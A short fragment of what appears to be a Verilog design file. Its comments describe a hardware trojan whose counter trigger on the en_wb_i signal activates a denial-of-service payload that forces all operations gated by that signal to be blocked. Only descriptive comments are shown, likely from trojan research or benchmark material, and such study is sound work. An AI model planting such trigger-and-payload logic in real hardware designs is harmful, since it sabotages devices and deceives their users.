 ...
 * 
 * Description:
 *   Disables operations by blocking en_wb_i control signal
 *   
 * Trigger: Counter on en_wb_i
 * Payload: Block en_wb_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block en_wb_i when trojan is active
//
// IMPORTANT: en_wb_i is an INPUT signal - we CANNOT assign to it!
...
//   Condition becomes: en_wb_i && 0 = 0 (always false)
//   All operations controlled by en_wb_i are blocked
